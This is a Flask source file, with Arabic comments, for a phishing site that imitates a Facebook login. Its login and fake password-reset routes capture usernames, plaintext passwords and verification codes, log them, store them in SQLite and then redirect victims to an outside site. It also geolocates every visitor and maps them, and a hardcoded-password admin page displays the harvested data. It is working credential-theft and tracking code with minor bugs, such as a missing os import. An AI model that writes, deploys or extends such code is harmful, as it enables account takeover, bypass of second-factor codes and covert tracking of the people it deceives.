from flask import Flask, request, redirect, render_template, send_from_directory, session
from datetime import datetime
import logging
import sqlite3
import requests
from colorama import Fore
import folium
# ========================
# إنشاء قاعدة البيانات
# ========================
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    # جدول تسجيل الحسابات
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        ip TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        time TEXT
    )
    """)

    # جدول أكواد التحقق
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        code TEXT,
        ip TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        time TEXT
    )
    """)

    # جدول الزيارات (مع إحداثيات الموقع)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS visits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        country TEXT,
        city TEXT,
        isp TEXT,
        path TEXT,
        method TEXT,
        user_agent TEXT,
        visitor_type TEXT,
        time TEXT,
        lat REAL,
        lon REAL
    )
    """)

    conn.commit()
    conn.close()

# ========================
# Logging
# ========================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

print(Fore.GREEN + "++++++++++++++++++++ SERVER STARTED ++++++++++++++++++++")

# ========================
# Flask
# ========================
app = Flask(__name__)
app.secret_key = "secret123"

# ========================
# استخراج IP الحقيقي
# ========================
def get_real_ip():
    # افحص كل Headers الممكنة للحصول على IP
    ip = request.headers.get("X-Forwarded-For")
    if not ip:
        ip = request.headers.get("X-Real-IP")
    if not ip:
        ip = request.remote_addr
    if ip:
        ip = ip.split(",")[0].strip()
    return ip

# ========================
# تحديد الموقع
# ========================
def get_location(ip):
    try:
        url = f"https://ipapi.co/{ip}/json/"
        response = requests.get(url, timeout=3)
        data = response.json()
        country = data.get("country", "Unknown")
        city = data.get("city", "Unknown")
        isp = data.get("isp", "Unknown")
        lat = data.get("lat", None)  # خط العرض
        lon = data.get("lon", None)  # خط الطول

        return country, city, isp, lat, lon
    except Exception as e:
        logging.error(f"Location API error: {e}")
        return None, None, None, None, None

# ========================
# تسجيل كل request
# ========================

@app.before_request
def log_every_request():
    if request.path in ["/ping", "/favicon.ico"]:
        return  # تجاهل ping و favicon

    ip = get_real_ip()
    country, city, isp, lat, lon = get_location(ip)

    path = request.path
    method = request.method
    user_agent = request.headers.get("User-Agent", "").lower()
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # تمييز نوع الزائر
    if "facebookexternalhit" in user_agent:
        visitor_type = "Facebook Bot"
    elif "uptimerobot" in user_agent:
        visitor_type = "UptimeRobot"
    elif "bot" in user_agent or "crawl" in user_agent:
        visitor_type = "Other Bot"
    else:
        visitor_type = "Real User"

    logging.info(f"{visitor_type} | {method} {path} | {ip} | {country} | {city} | {isp}")

    # حفظ الزيارة في قاعدة البيانات
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
    INSERT INTO visits (ip, country, city, isp, path, method, user_agent, visitor_type, time, lat, lon)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (ip, country, city, isp, path, method, user_agent, visitor_type, time, lat, lon))
    conn.commit()
    conn.close()

# ========================
# favicon
# ========================
@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico')

# ========================
# ping
# ========================
@app.route("/ping")
def ping():
    logging.info(Fore.BLACK + "(PING) request received")
    return "OK", 200

# ========================
# الصفحة الرئيسية
# ========================
@app.route("/")
def home():
    logging.info(Fore.GREEN + "User opened homepage")
    return render_template("FacebookForm.html")

# ========================
# detect device
# ========================
def detect_device(user_agent):
    ua = user_agent.lower()

    if "android" in ua or "iphone" in ua:
        device = "Mobile Phone"
    elif "ipad" in ua or "tablet" in ua:
        device = "Tablet"
    else:
        device = "Computer"

    if "windows" in ua:
        os_name = "Windows"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ios" in ua:
        os_name = "iOS"
    elif "mac" in ua:
        os_name = "MacOS"
    else:
        os_name = "Unknown"

    if "chrome" in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua and "chrome" not in ua:
        browser = "Safari"
    else:
        browser = "Unknown"

    return device, os_name, browser

# ========================
# login
# ========================
@app.route("/login", methods=["POST"])
def login():

    username = request.form.get("username")
    password = request.form.get("password")

    logging.info(Fore.RED + f"Login attempt with username : {username} and password : {password}")

    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("""
    INSERT INTO users (email, password, ip, device, os, browser, time)
    VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (username, password, ip, device, os_name, browser, time))

    conn.commit()
    conn.close()

    login_botton_url = "https://2742404919047.sarhne.com"
    logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
    return redirect(login_botton_url)

# ========================
# create
# ========================
@app.route("/create")
def create():
    return redirect("https://www.fhyi.com")

# ========================
# forgot
# ========================
@app.route("/forgot")
def forgot():
    return render_template("forgot.html")

# ========================
# verify
# ========================
@app.route("/verify", methods=["POST"])
def verify():

    phone_or_email = request.form.get("phone_or_email")
    session["phone_or_email"] = phone_or_email

    logging.info(Fore.GREEN + f"Verify request: {phone_or_email}")

    logging.info("Redirected user to verify code page")
    return render_template("verify.html")

# ========================
# verify_code
# ========================
@app.route("/verify_code", methods=["POST"])
def verify_code():

    code = request.form.get("code")
    phone_or_email = session.get("phone_or_email", "Unknown")

    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("""
    INSERT INTO codes (email, code, ip, device, os, browser, time)
    VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (phone_or_email, code, ip, device, os_name, browser, time))

    conn.commit()
    conn.close()

    logging.info(Fore.RED + f"Verify Code: {code}")

    login_botton_url = "https://2742404919047.sarhne.com"
    logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
    return redirect(login_botton_url)

# ========================
# Admin Login
# ========================
@app.route("/admin_login", methods=["GET", "POST"])
def admin_login():

    if request.method == "POST":

        username = request.form.get("username")
        password = request.form.get("password")

        if username == "Hasan@RR" and password == "RafifIsMyLove":
            session["admin"] = True
            return redirect("/admin")
        else:
            return "❌ بيانات خاطئة"

    return """
    <h2>Admin Login</h2>
    <form method="POST">
    <input name="username"><br><br>
    <input name="password" type="password"><br><br>
    <button>Login</button>
    </form>
    """

# ========================
# admin
# ========================
@app.route("/admin")
def admin():

    if not session.get("admin"):
        return redirect("/admin_login")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM visits")
    visits = cursor.fetchall()

    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()

    cursor.execute("SELECT * FROM codes")
    codes = cursor.fetchall()

    conn.close()

    html = "<h2>Users</h2><table border='1' cellpadding='5'><tr>"
    html += "<th>ID</th><th>Email</th><th>Password</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"

    for user in users:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in user) + "</tr>"

    html += "</table><br><br>"

    html += "<h2>Codes</h2><table border='1' cellpadding='5'><tr>"
    html += "<th>ID</th><th>Email</th><th>Code</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"

    for code in codes:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in code) + "</tr>"

    html += "</table><br><br>"

    html += "<h2>Visits</h2><table border='1' cellpadding='5'><tr>"
    html += "<th>ID</th><th>IP</th><th>Country</th><th>City</th><th>ISP</th><th>Path</th><th>Method</th><th>User Agent</th><th>Visitor Type</th><th>Time</th></tr><th>Latitude</th><th>Longitude</th></tr>"

    for visit in visits:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in visit) + "</tr>"

    html += "</table>"

    return html

# ========================
# logout
# ========================
@app.route("/logout")
def logout():
    session.pop("admin", None)
    return "تم تسجيل الخروج"
# ========================
# دالة تحديد location
# ========================

@app.route("/map")
def map_view():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT ip, city, country, visitor_type, lat, lon FROM visits WHERE lat IS NOT NULL AND lon IS NOT NULL")
    visits = cursor.fetchall()
    conn.close()

    # خريطة مركزها أول زيارة أو مركز عالمي
    m = folium.Map(location=[20,0], zoom_start=3, tiles="Esri.WorldImagery")

    for ip, city, country, visitor_type, lat, lon in visits:
        folium.Marker(
            location=[lat, lon],
            popup=f"{ip} | {city}, {country} | {visitor_type}"
        ).add_to(m)

    return m._repr_html_()  # يعرض الخريطة مباشرة في HTML
# ========================
# تشغيل السيرفر
# ========================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    logging.info("Server is running...")
    app.run(host="0.0.0.0", port=port)